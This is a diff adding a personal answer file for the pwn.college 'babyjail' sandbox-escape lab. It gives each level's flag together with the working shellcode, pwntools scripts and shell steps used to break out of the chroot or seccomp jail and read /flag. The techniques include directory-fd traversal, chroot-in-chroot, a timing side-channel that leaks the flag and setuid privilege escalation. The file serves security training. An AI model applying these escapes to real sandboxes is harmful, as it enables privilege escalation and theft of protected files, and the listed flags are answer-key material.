@@ -1,0 +1,600 @@
+1. pwn.college{QngQtv0FFsk7RXf4v6_tvU3J5WY.QXxMjMsITNxUzW}
+
+/challenge/$HOSTNAME ../../flag
+
+2. pwn.college{Ae008J0DR4Tw-rHb_am05oIDaph.QXyMjMsITNxUzW}
+
+/challenge/$HOSTNAME /hi < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+
+
+
+    lea rdi, [rip+flag]
+    mov rax, 2 
+    mov rsi, 0
+    syscall
+
+    mov rdi, 1
+    mov rsi, rax 
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+
+    mov rax, 60
+    syscall
+
+flag: 
+    .string "flag"
+
+3. pwn.college{QMw8wc4KI4YHgW-CsP4SX8GTiqV.QXzMjMsITNxUzW}
+
+/challenge/$HOSTNAME / < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    mov rdi, 3
+    mov rax, 257
+    mov rdx, 0
+    lea rsi, [rip+flag]
+    syscall
+
+    mov rdi, 1
+    mov rsi, rax 
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+
+    mov rax, 60
+    syscall
+
+root:
+    .string "../../"
+
+flag:
+    .string "flag"
+
+4. pwn.college{sjF7u62NwPF1UK4ytYlbZpYtobA.QX0MjMsITNxUzW}
+
+/challenge/$HOSTNAME / < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    mov rdi, 3
+    mov rax, 257
+    mov rdx, 0
+    lea rsi, [rip+flag]
+    syscall
+
+    mov rdi, 1
+    mov rsi, rax 
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+
+    mov rax, 60
+    syscall
+
+root:
+    .string "../../"
+
+flag:
+    .string "flag"
+
+5. pwn.college{c-nA1tgRuF52PDrdzg8z7F0oA1t.QX1MjMsITNxUzW}
+
+/challenge/$HOSTNAME / < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    mov rax, 2
+    lea rdi, [rip+root]
+    mov rsi, 0
+    syscall
+
+    mov rdx, rax
+    mov rax, 265
+    mov rdi, 3
+    lea rsi, [rip+flag]
+    lea r10, [rip+flag2]
+    mov r8, 0
+    syscall
+
+    mov rax, 2
+    lea rdi, [rip+flag2]
+    mov rsi, 0
+    syscall
+
+    mov rdi, 1
+    mov rsi, rax 
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+
+    mov rax, 60
+    syscall
+
+root:
+    .string "/"
+
+flag:
+    .string "flag"
+
+flag2:
+    .string "/f"
+
+6. pwn.college{MoDGl5sQPsTByai_yaxLA9HmNBw.QX2MjMsITNxUzW}
+
+/challenge/$HOSTNAME / < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    mov rax, 81
+    mov rdi, 3
+    syscall
+
+    mov rax, 2
+    lea rdi, [rip+flag]
+    mov rsi, 0
+    syscall
+
+    mov rdi, 1
+    mov rsi, rax 
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+
+    mov rax, 60
+    syscall
+
+root:
+    .string "/"
+
+flag:
+    .string "flag"
+
+7. pwn.college{4Cr_L7mPsnhGTZMFF2Fg2LNs3TA.QX3MjMsITNxUzW}
+
+/challenge/$HOSTNAME / < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    #mkdir foo; chroot foo; cd ..
+
+    mov rax, 83
+    lea rdi, [rip+foo]
+    mov rsi, 0755
+    syscall 
+
+    mov rax, 161
+    lea rdi, [rip+foo]
+    syscall 
+
+    mov rax, 80
+    lea rdi, [rip+root]
+    syscall
+
+    mov rax, 2
+    lea rdi, [rip+flag]
+    mov rsi, 0
+    syscall
+
+    mov rdi, 1
+    mov rsi, rax 
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+
+    mov rax, 60
+    syscall
+
+root:
+    .string "../../"
+
+foo:
+    .string "foo"
+
+flag:
+    .string "flag"
+
+8. pwn.college{85Z7gtphM263rsrEiEPmv2Wsp65.QX4MjMsITNxUzW}
+
+exec 5< /
+/challenge/$HOSTNAME < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    mov rdi, 5
+    mov rax, 257
+    mov rdx, 0
+    lea rsi, [rip+flag]
+    syscall
+
+    mov rdi, 1
+    mov rsi, rax 
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+
+    mov rax, 60
+    syscall
+
+root:
+    .string "../../"
+
+flag:
+    .string "flag"
+
+9. pwn.college{okr1nOYqhM0V1w_WhPKSKlAFW12.QX5MjMsITNxUzW}
+
+/challenge/$HOSTNAME < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    # mkdir foo
+    mov eax, 39
+    lea ebx, [eip+foo]
+    mov ecx, 0755
+    int 0x80
+
+    # chroot foo
+    mov eax, 61
+    lea ebx, [rip+foo]
+    int 0x80 
+
+    # chdir ../../
+    mov eax, 12
+    lea ebx, [eip+root]
+    int 0x80
+
+    # open(flag, 0)
+    mov eax, 5
+    lea ebx, [eip+flag]
+    xor ecx, ecx
+    int 0x80
+
+    
+    # sendfile(1, open(), 0, 1000)
+    mov ebx, 1
+    mov ecx, eax 
+    mov edx, 0
+    mov esi, 1000
+    mov eax, 187
+    int 0x80
+
+    # exit()
+    mov eax, 1
+    int 0x80
+
+root:
+    .string "../../../../../"
+
+foo:
+    .string "foo"
+
+flag:
+    .string "/flag"
+
+10. pwn.college{cOK6jAZl2aN5l4G0kQZ7fNsaN0m.QXwQjMsITNxUzW}
+
+python3 j.py
+
+from pwn import *
+import os
+
+context.arch = 'amd64'
+context.encoding ='latin'
+context.log_level = 'INFO'
+warnings.simplefilter('ignore')
+
+flag = ""
+
+for i in range(0, 55):
+    assembly = f""" 
+        xor rax, rax
+        mov rdi, 3
+        mov rsi, rsp
+        mov rdx, 55 
+        syscall
+
+        mov rax, 60
+        mov dil, byte ptr[rsp+{i}]
+        syscall
+    """
+    with process([f"/challenge/babyjail_level10", "/flag"]) as p:
+        p.send(asm(assembly))
+        p.readrepeat(1)
+        flag = flag + chr(p.poll(True))
+
+print(flag)
+
+11. pwn.college{kfFcZCKKbC_o7cq0yAWccjcTqjQ.QXxQjMsITNxUzW}
+
+python3 j.py
+
+from pwn import *
+import os
+import time
+
+context.arch = 'amd64'
+context.encoding ='latin'
+context.log_level = 'INFO'
+warnings.simplefilter('ignore')
+
+iter_progress = log.progress("PROGRESS")
+flag_prog = log.progress("FLAG")
+flag = ""
+
+for i in range(0, 55):
+    biny = ''
+    for pwr in range (6, -1, -1): 
+        iter_progress.status(f"ITERATION {i}, BIT {pwr}")
+
+        assembly = f""" 
+        xor rax, rax
+        mov rdi, 3
+        mov rsi, rsp
+        mov rdx, 55 
+        syscall
+
+        mov rdi, 0
+        mov dil, byte ptr [rsp+{i}]
+        
+        mov r8, {pow(2, pwr)}
+
+        mov r9, rdi
+        and r9, r8
+        cmp r9, r8 
+        jne fail
+
+        mov qword ptr [rsp], 2
+        mov qword ptr [rsp+8], 0
+        mov rdi, rsp
+        mov rax, 35
+        syscall
+
+        fail:
+        """
+        start_time = time.time()
+        with process(["/challenge/babyjail_level11", "/flag"], level='CRITICAL') as p:
+            # info(p.readrepeat(1))
+            p.send(asm(assembly))
+            # info(p.readrepeat(1))
+            # info(f"exit: {p.poll(True)}")
+            # flag = flag + chr(p.poll(True))
+            p.poll(True)
+        if time.time()-start_time > 2: 
+            biny += f"1"
+        else:
+            biny += f"0"
+
+    flag += chr(int(biny, 2))
+    flag_prog.status(repr(flag))
+
+print(flag)
+
+12. pwn.college{I9Wdeqjd5XPCl7mgafru6hrM75q.QXyQjMsITNxUzW}
+
+python3 j.py
+
+from pwn import *
+import os
+import time
+
+context.arch = 'amd64'
+context.encoding ='latin'
+context.log_level = 'INFO'
+warnings.simplefilter('ignore')
+
+iter_progress = log.progress("PROGRESS")
+flag_prog = log.progress("FLAG")
+flag = ""
+
+for i in range(0, 55):
+    biny = ''
+    for pwr in range (6, -1, -1): 
+        iter_progress.status(f"ITERATION {i}, BIT {pwr}")
+
+        assembly = asm(f""" 
+        xor rax, rax
+        mov rdi, 3
+        mov rsi, rsp
+        mov rdx, 55 
+        syscall
+
+        mov rdi, 0
+        mov dil, byte ptr [rsp+{i}]
+        
+        mov r8, {pow(2, pwr)}
+
+        mov r9, rdi
+        and r9, r8
+        cmp r9, r8 
+        jne fail
+
+        loop:
+        jmp loop
+
+        fail:
+        """)
+        start_time = time.time()
+        with process(["/challenge/babyjail_level12", "/flag"], level='CRITICAL', alarm=3) as p:
+            # info(p.readrepeat(1))
+            p.send(assembly)
+            # info(p.readrepeat(1))
+            # info(f"exit: {p.poll(True)}")
+            # flag = flag + chr(p.poll(True))
+            p.poll(True)
+        if time.time()-start_time > 2: 
+            biny += f"1"
+        else:
+            biny += f"0"
+
+    flag += chr(int(biny, 2))
+    flag_prog.status(repr(flag))
+
+print(flag)
+
+13. pwn.college{oARUnk52Ed61An-8I9moj5OWXmT.QXzQjMsITNxUzW}
+
+./j.sh
+/challenge/$HOSTNAME < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    mov rax, 1
+    mov rdi, 4
+    lea rsi, [rip+send]
+    mov rdx, 128
+    syscall
+
+    xor rax, rax
+    mov rdi, 4
+    mov rsi, rsp
+    mov rdx, 128 
+    syscall
+
+    mov rax, 1
+    mov rdi, 4
+    lea rsi, [rsp+5]
+    mov rdx, 10
+    syscall
+
+flag:
+    .string "print_msg "
+
+send:
+    .string "read_file /flag"
+
+14. pwn.college{sDKAHg6qcD2vXZccLnkBYBmhEoq.01NwMzMsITNxUzW}
+
+cat /old/flag 
+
+15. pwn.college{05eq7pkUo6AeU2BHXNQIIkUU_Sl.0FOwMzMsITNxUzW}
+
+in jail: chmod u+s /usr/bin/cat 
+out of jail: cat /flag
+
+16. pwn.college{sb18bpxOfF0HhDVu-e2QILBC1ex.0VOwMzMsITNxUzW}
+
+in jail: create file a.c
+out of jail: edit file a.c 
+in jail: run ./out, then chmod u+s /usr/bin/cat 
+out of jail: run cat /flag 
+
+a.c code: 
+int main(){
+    assert(mount(NULL, "/usr", NULL, MS_REMOUNT|MS_BIND, NULL) != -1);
+    return 0;
+}
+
+
+17. pwn.college{AeB1B6Gmd1VhvJTLPmw031XhWyN.0FMxMzMsITNxUzW}
+
+/challenge/babyjail_level17 / < e.bin
+
+.global _start
+.intel_syntax noprefix
+_start:
+    mov rax, 257
+    mov rdi, 3
+    lea rsi, [rip+flag]
+    mov rdx, 0
+    syscall
+
+    mov rdi, 1
+    mov rsi, rax 
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+
+    mov rax, 60
+    syscall
+
+18. pwn.college{MxKB6R7ADOgL6l7Pb9laYpxoJ41.0VMxMzMsITNxUzW}
+
+1. /challenge/babyjail_level18 /home/hacker < e.bin
+
+assembly:
+
+.global _start
+.intel_syntax noprefix
+_start:
+    mov rax, 165
+    mov rdi, 0
+    lea rsi, [rip+data]
+    mov rdx, 0
+    mov r10, 4128
+    mov r8, 0
+    syscall
+
+    mov rax, 90
+    lea rdi, [rip+root]
+    mov rsi, 0777
+    syscall
+
+    mov rax, 90
+    lea rdi, [rip+flag]
+    mov rsi, 0777
+    syscall
+
+    mov rax, 59
+    lea rdi, [rip+cat]
+    mov rsi, 0
+    mov rdx, 0
+    syscall
+
+    mov rax, 60
+    syscall
+
+    ret
+
+flag:
+    .string "flag"
+
+root:
+    .string "/"
+
+data:
+    .string "/data"
+
+cat:
+    .string "/data/out"
+
+
+c code:
+
+int main(){
+    sleep(30);
+    chown("/a", 0, 0);
+    chmod("/a", 04755);
+    sendfile(1, open("/flag", 0), 0, 1000);
+}
+
+2. let the above run then do 
+    gcc -static -o /tmp/jail-{YOUR JAIL}/a a.c
+    /tmp/jail-{YOUR JAIL}/a
+
+
+
+
+
+
